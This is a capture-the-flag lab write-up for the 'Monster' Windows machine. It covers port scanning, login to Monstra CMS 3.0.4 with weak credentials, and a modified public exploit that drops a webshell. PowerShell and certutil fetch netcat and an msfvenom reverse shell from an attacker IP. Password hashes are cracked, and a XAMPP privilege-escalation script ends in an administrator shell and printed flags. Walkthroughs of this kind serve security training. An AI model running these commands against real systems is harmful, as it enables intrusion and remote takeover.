# Monster

## Initial access

Ran `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.224.180
```

Open ports discovered:

- **80** — HTTP (Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10))
  - Additional webpages:
    - `http://192.168.224.180/assets/`
    - `http://192.168.224.180/blog/`
    - `http://192.168.224.180/examples` (503)
    - `http://192.168.224.180/licenses` (403)
    - `http://192.168.224.180/phpmyadmin` (403)
    - `http://192.168.224.180/server-info` (403)
    - `http://192.168.224.180/server-status` (403)
    - `http://192.168.224.180/webalizer` (403)
- **135** — MSRPC
- **139** — NetBIOS-SSN (Microsoft Windows netbios-ssn)
- **443** — HTTPS (Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10))
  - Additional webpages: same as HTTP
- **445** — Microsoft-DS
- **3389** — RDP (Microsoft Terminal Services)
- **5040** — Unknown
- **49664–49669** — MSRPC (dynamic ports)

Ran a follow-up `nmap` scan with more flags to gather additional service and certificate details:

```
nmap -sVC -p- -v -T4 -sT --open 192.168.224.180
...
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_http-title: Mike Wazowski
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.3.10)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:     a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1:   b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
|_SHA-256: 0169 7338 0c0f 1df0 0bd9 593e d8d5 efa3 706c d6df 7993 f614 1272 b805 22ac dd23
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10
|_ssl-date: TLS randomness does not represent time
| http-methods:
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
|_http-title: Mike Wazowski
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=Mike-PC
| Issuer: commonName=Mike-PC
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-11-17T14:40:42
| Not valid after:  2027-05-19T14:40:42
| MD5:     58b0 7de7 dbaf 22a9 7fbf 10e7 94be 63ef
| SHA-1:   53f4 1805 e0a1 5fe5 9122 9836 bac1 5a6f 37fd 42ee
|_SHA-256: 4a99 d4d0 d405 6cf8 e3aa 9bcb e13c 2424 a313 d360 5631 e509 409d 5cc4 5e74 428b
|_ssl-date: 2026-11-18T14:54:09+00:00; 0s from scanner time.
| rdp-ntlm-info:
|   Target_Name: MIKE-PC
|   NetBIOS_Domain_Name: MIKE-PC
|   NetBIOS_Computer_Name: MIKE-PC
|   DNS_Domain_Name: Mike-PC
|   DNS_Computer_Name: Mike-PC
|   Product_Version: 10.0.19041
|_  System_Time: 2026-11-18T14:53:55+00:00
5040/tcp  open  unknown
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Navigated to `http://192.168.224.180/` and observed the page contains the name "Mike Wazowski" and the email `wazowski@offsec.pg`.

Browsing to `http://192.168.224.180/blog/` revealed links pointing to `http://monster.pg`. Added the domain to `/etc/hosts`:

```
192.168.224.180 monster.pg
```

The blog is powered by **Monstra 3.0.4**.

Searched for vulnerabilities specific to Monstra 3.0.4:

```
searchsploit monstra 3.0.4
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
 Monstra 3.0.4 - Stored Cross-Site Scripting (XSS)                                  | php/webapps/51519.txt
 Monstra CMS 3.0.4 - (Authenticated) Arbitrary File Upload / Remote Code Execution  | php/webapps/43348.txt
 Monstra CMS 3.0.4 - Arbitrary Folder Deletion                                      | php/webapps/44512.txt
 Monstra CMS 3.0.4 - Authenticated Arbitrary File Upload                            | php/webapps/48479.txt
 Monstra cms 3.0.4 - Persitent Cross-Site Scripting                                 | php/webapps/44502.txt
 Monstra CMS 3.0.4 - Remote Code Execution (Authenticated)                          | php/webapps/49949.py
 Monstra CMS 3.0.4 - Remote Code Execution (RCE)                                    | php/webapps/52038.py
 Monstra CMS < 3.0.4 - Cross-Site Scripting (1)                                     | php/webapps/44855.py
 Monstra CMS < 3.0.4 - Cross-Site Scripting (2)                                     | php/webapps/44646.txt
 Monstra-Dev 3.0.4 - Cross-Site Request Forgery (Account Hijacking)                 | php/webapps/45164.txt
----------------------------------------------------------------------------------- ---------------------------------
```

All exploits require authentication. Visited `http://monster.pg/blog/users` which listed two accounts: `admin` (`wazowski@monster.pg`) and `mike` (`mike@monster.pg`).

Logged in with the credentials `admin:wazowski` at `http://monster.pg/blog/users/login`.

Downloaded the authenticated RCE exploit (EDB 52038) and modified it to fix Python indentation and formatting issues so it runs correctly:

```
searchsploit -m 52038

diff 52038.py 52038_modified.py
17,18c17,18
< print("Usage: python3 script.py <url> <username> <password>")
< sys.exit(1)
---
>     print("Usage: python3 script.py <url> <username> <password>")
>     sys.exit(1)
26,31c26,27
< login_url = f'{base_url}/admin/index.php?id=dashboard'
< login_data = {
< 'login': username,
< 'password': password,
< 'login_submit': 'Log+In'
< }
---
> login_url = f"{base_url}/admin/index.php?id=dashboard"
> login_data = {"login": username, "password": password, "login_submit": "Log+In"}
33,34c29
< filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=
< 5))
---
> filename = "".join(random.choices(string.ascii_lowercase + string.digits, k=5))
39,40c34,35
< if 'Dashboard' in response.text:
< print("Login successful")
---
> if "Dashboard" in response.text:
>     print("Login successful")
42,43c37,38
< print("Login failed")
< exit()
---
>     print("Login failed")
>     exit()
47,49c42,43
< edit_url = f'{base_url}/admin/index.php?id=themes&action=add_chunk'
< response = session.get(edit_url) # CSRF token bulmak için edit sayfasına
< erişim
---
> edit_url = f"{base_url}/admin/index.php?id=themes&action=add_chunk"
> response = session.get(edit_url)  # CSRF token bulmak için edit sayfasınaerişim
51,52c45,47
< token_search = re.search(r'input type="hidden" id="csrf" name="csrf" value="
< (.*?)"', response.text)
---
> token_search = re.search(
>     r'input type="hidden" id="csrf" name="csrf" value="(.*?)"', response.text
> )
54c49
< token = token_search.group(1)
---
>     token = token_search.group(1)
56,57c51,52
< print("CSRF token could not be found.")
< exit()
---
>     print("CSRF token could not be found.")
>     exit()
59c54
< content = '''
---
> content = """
76c71
< '''
---
> """
78,83c73
< edit_data = {
< 'csrf': token,
< 'name': filename,
< 'content': content,
< 'add_file': 'Save'
< }
---
> edit_data = {"csrf": token, "name": filename, "content": content, "add_file": "Save"}
90,91c80
< print(f"Your shell is ready: {base_url}/public/themes/default/{filename}
< .chunk.php")
---
>     print(f"Your shell is ready: {base_url}/public/themes/default/{filename}.chunk.php")
93c82
< print("Failed to prepare shell.")
\ No newline at end of file
---
>     print("Failed to prepare shell.")
```

Ran the modified exploit to deploy a webshell:

```
python3 52038_modified.py http://monster.pg/blog admin wazowski
Logging in...
Login successful
Preparing shell...
Your shell is ready: http://monster.pg/blog/public/themes/default/abhhb.chunk.php
```

The webshell at `http://monster.pg/blog/public/themes/default/abhhb.chunk.php` accepts commands via a `cmd` query parameter. Verified it works with `whoami`, which returned `mike-pc\mike`.

Attempted to download `nc64.exe` via the webshell using `certutil`, but `system()` was blocked by the PHP execution context:

```
**Warning**:  system(): Unable to fork [certutil -urlcache -split -f http://192.168.45.208:9001/windows/shells/nc64.exe nc.exe] in **C:\xampp\htdocs\blog\public\themes\default\abhhb.chunk.php** on line **12**
```

Used PowerShell instead to download `nc64.exe`:

```
powershell -c iwr -uri http://192.168.45.208:9001/windows/shells/nc64.exe -OutFile nc.exe
```

Generated a reverse shell payload (`nc.exe 192.168.45.208 4444 -e cmd`) and appended it as the `cmd` parameter to the webshell URL. Caught the reverse shell on `penelope`:

```
C:\xampp\htdocs\blog\public\themes\default>whoami
mike-pc\mike
```

Retrieved the `local.txt` flag:

```
C:\xampp\htdocs\blog\public\themes\default>powershell -c "Get-ChildItem C:\ -Recurse -Filter local.txt -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName"
C:\Users\Mike\Desktop\local.txt

C:\xampp\htdocs\blog\public\themes\default>type C:\Users\Mike\Desktop\local.txt
86a66b0434999b5a6d191261ed534034
```

### Alternative Initial Access — database hash leak via backup feature

The Monstra admin panel includes a backup manager at `/blog/admin/index.php?id=backup`. Creating a new backup and downloading it produces a full archive of the site, including the `data/users/users.table.xml` file which contains salted MD5 password hashes for all CMS accounts. The admin hash (`admin:81b1794b3361efd89b26fc9d92ad4275`) was used with the known plaintext password `wazowski` to determine the salt and iteration count via `mdxfind`. The same salt and iteration count were then applied to crack the `mike` user's hash (`844ffc2c7150b93c4133a6ff2e1a2dba`) with rockyou.txt, yielding the plaintext password. This password was used to log in via RDP as the `mike` user, providing an alternative foothold without relying on the authenticated RCE exploit.

Credit: [The Husky Hacker — Monster Writeup](https://hackindex.io/writeups/monster)

## Privilege escalation

Uploaded `winPEASx64.exe` to the target via the webshell and ran it:

```
C:\Windows\Temp>cd C:\Windows\Temp
C:\Windows\Temp>certutil -urlcache -split -f http://192.168.45.208:9001/windows/enum/winPEASx64.exe winPEASx64.exe

C:\Windows\Temp>C:\Windows\Temp\winPEASx64.exe
```

WinPEAS identified that the XAMPP installation directory (`C:\xampp`) and several XAMPP-related processes are writable by the current user (`mike-pc\mike`), with `Authenticated Users` having `WriteData/CreateFiles` permissions on key directories:

```
╔══════════╣ Interesting Processes -non Microsoft- (T1057)
    httpd(5268)[c:\xampp\apache\bin\httpd.exe] -- POwn: Mike
    Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking folder: c:\xampp\apache\bin (Authenticated Users [Allow: WriteData/CreateFiles])
    Command Line: c:\xampp\apache\bin\httpd.exe
   =================================================================================================
    xampp-control(3284)[C:\xampp\xampp-control.exe] -- POwn: Mike
    Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\xampp (Authenticated Users [Allow: WriteData/CreateFiles])
    Command Line: "C:\xampp\xampp-control.exe"
   =================================================================================================
    httpd(4048)[C:\xampp\apache\bin\httpd.exe] -- POwn: Mike
    Permissions: Authenticated Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking folder: C:\xampp\apache\bin (Authenticated Users [Allow: WriteData/CreateFiles])
    Command Line: C:\xampp\apache\bin\httpd.exe -d C:/xampp/apache
   =================================================================================================
...
╔══════════╣ Installed Applications --Via Program Files/Uninstall registry-- (T1518)
https://book.hacktricks.wiki/en-windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\xampp(Authenticated Users [Allow: WriteData/CreateFiles]
```

The XAMPP version was identified as **7.3.10** by checking `C:\xampp\readme_en.txt`.

Searched for XAMPP privilege escalation vulnerabilities:

```
searchsploit xampp
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
 XAMPP 7.4.3 - Local Privilege Escalation                                           | windows/local/50337.ps1
 XAMPP for Windows 1.6.3a - Local Privilege Escalation                              | windows/local/4325.php
 XAMPP 8.2.4 - Unquoted Path                                                        | windows/local/51585.txt
 XAMPP Control Panel 3.2.2 - Buffer Overflow (SEH) (Unicode)                        | windows/local/45828.py
----------------------------------------------------------------------------------- ---------------------------------
```

Downloaded the XAMPP 7.4.3 local privilege escalation script (EDB 50337) and modified it to point to a custom reverse shell binary:

```
searchsploit -m 50337

diff 50337.ps1 50337_modified.ps1
13c13
< $replace = "C:\temp\msf.exe"
---
> $replace = "C:\Users\Public\rev_shell.exe"
```

Generated a Windows reverse shell binary with msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.208 LPORT=4444 -f exe -o rev_shell.exe
```

Downloaded both the modified exploit and the reverse shell binary onto the target using PowerShell (since `certutil` returned `Access is denied` at this point):

```
C:\Users\Public>powershell -c iwr -uri http://192.168.45.208:9001/50337_modified.ps1 -OutFile 50337_modified.ps1
C:\Users\Public>powershell -c iwr -uri http://192.168.45.208:9001/windows/shells/rev_shell.exe -OutFile rev_shell.exe
```

Ran the privilege escalation script and caught a reverse shell as `mike-pc\administrator` on `penelope`:

```
C:\Users\Public>powershell -c 50337_modified.ps1

# penelope
C:\WINDOWS\system32>whoami
mike-pc\administrator
```

Retrieved the `proof.txt` flag:

```
C:\WINDOWS\system32>powershell -c "Get-ChildItem C:\ -Recurse -Filter proof.txt -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty FullName"
C:\Users\Administrator\Desktop\proof.txt

C:\WINDOWS\system32>type C:\Users\Administrator\Desktop\proof.txt
75d5d8e313c4ea0f55ec3b22c2123308
```

**NOTE**: The target is vulnerable to CVE-2026-42980. A kernel exploit can be run to gain a privileged shell if RDP access to the target machine is achieved.
